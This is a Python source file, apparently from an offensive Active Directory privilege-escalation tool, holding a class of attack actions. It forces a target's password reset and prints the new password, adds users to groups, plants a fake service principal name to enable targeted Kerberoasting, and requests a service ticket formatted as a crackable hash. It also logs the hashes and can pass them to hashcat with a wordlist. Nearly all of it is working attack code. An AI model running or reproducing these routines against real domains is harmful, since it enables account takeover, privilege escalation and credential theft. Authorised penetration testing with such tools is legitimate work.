"""Shared privesc actions for the module-based architecture."""

import binascii
import logging
import re
import subprocess
from datetime import datetime
from pathlib import Path

from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
from impacket.krb5.types import Principal
from ldap3 import BASE, MODIFY_ADD, SUBTREE
from pyasn1.codec.der import decoder


class PrivescActions:
    def __init__(self, engine):
        self.engine = engine
        self.conn = engine.conn
        self.domain = engine.domain
        self.dc_ip = engine.dc_ip

    def resolve_distinguished_name(self, identity):
        """Resolve a DN from UPN/name/sAMAccountName/cn when path data lacks DN."""
        if not identity:
            return None

        if isinstance(identity, str) and identity.upper().startswith("CN="):
            return identity

        domain_parts = [part for part in str(self.domain).split(".") if part]
        search_base = ",".join([f"DC={part}" for part in domain_parts])
        if not search_base:
            return None

        candidate = str(identity)
        sam = candidate.split("@")[0] if "@" in candidate else candidate
        ldap_filter = (
            f"(|(distinguishedName={candidate})(userPrincipalName={candidate})"
            f"(sAMAccountName={sam})(name={candidate})(cn={candidate}))"
        )

        try:
            if self.conn.search(
                search_base=search_base,
                search_filter=ldap_filter,
                search_scope=SUBTREE,
                attributes=["distinguishedName"],
                size_limit=1,
            ) and self.conn.entries:
                return str(self.conn.entries[0].entry_dn)
        except Exception as e:
            print(f"  [!] DN LOOKUP FAILED for {identity}: {e}")

        return None

    def _resolve_kerberos_username(self):
        """Return a Kerberos-friendly username from the current LDAP bind identity."""
        raw_user = str(self.conn.user or "")
        if not raw_user:
            return raw_user

        if "\\" in raw_user:
            return raw_user.split("\\")[-1]

        if "@" in raw_user:
            return raw_user.split("@")[0]

        if raw_user.upper().startswith("CN="):
            try:
                if self.conn.search(
                    search_base=raw_user,
                    search_filter="(objectClass=*)",
                    search_scope=BASE,
                    attributes=["sAMAccountName", "userPrincipalName"],
                    size_limit=1,
                ) and self.conn.entries:
                    entry = self.conn.entries[0]

                    sam_attr = getattr(entry, "sAMAccountName", None)
                    if sam_attr and sam_attr.value:
                        return str(sam_attr.value)

                    upn_attr = getattr(entry, "userPrincipalName", None)
                    if upn_attr and upn_attr.value:
                        return str(upn_attr.value).split("@")[0]
            except Exception as e:
                print(f"  [!] USER RESOLUTION FAILED from DN bind: {e}")

        return raw_user

    def force_change_password(self, target_dn, new_password):
        print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
        result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
        if result:
            print(f"[+] Password successfully changed to: {new_password}")
        return result

    def add_group_member(self, group_dn, user_dn):
        print(f"  [*] Attempting LDAP MODIFY_ADD for member attribute...")
        success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [user_dn])]})

        if not success and self.conn.result["result"] == 68:
            print(f"  [-] Target is already a member of this group. Skipping safely.")
            return True

        return success

    def set_fake_spn(self, target_dn, spn_value="viper/roasted"):
        print(f"  [*] Attempting LDAP MODIFY_ADD for servicePrincipalName...")
        success = self.conn.modify(target_dn, {"servicePrincipalName": [(MODIFY_ADD, [spn_value])]})

        if not success:
            result_code = self.conn.result["result"]
            diagnostic = self.conn.result.get("message", "")

            if result_code == 68 or "1006" in diagnostic:
                print(f"  [-] SPN value '{spn_value}' already exists on target. Skipping safely.")
                return True

            print("  [!] SPN SET FAILED")
            print(f"  [!] LDAP ERROR: {self.conn.result.get('description', 'Unknown')}")
            print(f"  [!] DIAGNOSTIC: {diagnostic or 'No detail provided'}")

        return success

    def request_kerberoast_hash(self, target_user_name, spn, current_password):
        print(f"  [*] INITIATING: Remote TGS-REQ for SPN {spn}")

        try:
            target_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            user = self._resolve_kerberos_username()

            client_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                client_principal,
                str(current_password),
                str(self.domain),
                "",
                "",
                kdcHost=str(self.dc_ip),
            )

            tgs, cipher, old_session_key, session_key = getKerberosTGS(
                target_principal,
                str(self.domain),
                str(self.dc_ip),
                tgt,
                cipher,
                session_key,
            )

            etype = 23
            blob = None

            if isinstance(tgs, (bytes, bytearray)):
                decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
                blob = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()
            else:
                etype = int(tgs["ticket"]["enc-part"]["etype"])
                cipher_field = tgs["ticket"]["enc-part"]["cipher"]
                blob = cipher_field.asOctets() if hasattr(cipher_field, "asOctets") else bytes(cipher_field)

            if etype == 23 and len(blob) >= 16:
                checksum = binascii.hexlify(blob[:16]).decode()
                encrypted = binascii.hexlify(blob[16:]).decode()
                real_hash = f"$krb5tgs$23$*{target_user_name}${self.domain}${spn}*${checksum}${encrypted}"
            else:
                real_hash = f"$krb5tgs${etype}$*{target_user_name}*{self.domain}*{spn}*{binascii.hexlify(blob).decode()}"

            print(f"  [+] HASH EXTRACTED: {real_hash[:60]}...")
            return real_hash

        except Exception as e:
            print(f"  [!] KERBEROAST FAILED: {str(e)}")
            return False

    def persist_hash_and_maybe_crack(self, hash_value, target_user_name, spn_value):
        """Optionally persist the hash to a .kirbi file and run hashcat."""
        if not hash_value:
            return False

        # Keep the existing text log for tracking.
        text_log = Path.cwd() / "data" / "extracted_hashes.txt"
        text_log.parent.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.utcnow().isoformat(timespec="seconds") + "Z"
        with text_log.open("a", encoding="utf-8") as fh:
            fh.write(f"{timestamp} | target={target_user_name} | spn={spn_value} | {hash_value}\n")

        answer = input("Attempt to crack extracted hash with hashcat? [y/N]: ").strip().lower()
        if answer not in {"y", "yes"}:
            logging.info("Hash cracking skipped by user.")
            return True

        safe_name = re.sub(r"[^A-Za-z0-9._-]+", "_", str(target_user_name).split("@")[0].lower())
        kirbi_path = Path.cwd() / "data" / f"{safe_name}.kirbi"
        kirbi_path.write_text(f"{hash_value}\n", encoding="utf-8")
        logging.info(f"Saved hash to {kirbi_path}")

        hashcat_cmd = ["hashcat", "-m", "13100", str(kirbi_path), "/usr/share/wordlists/rockyou.txt"]
        logging.info("Running: %s", " ".join(hashcat_cmd))

        try:
            completed = subprocess.run(hashcat_cmd, check=False)
            if completed.returncode != 0:
                logging.warning(f"hashcat exited with code {completed.returncode}")
        except FileNotFoundError:
            logging.error("hashcat not found in PATH.")
        except Exception as exc:
            logging.error(f"hashcat execution failed: {exc}")

        return True
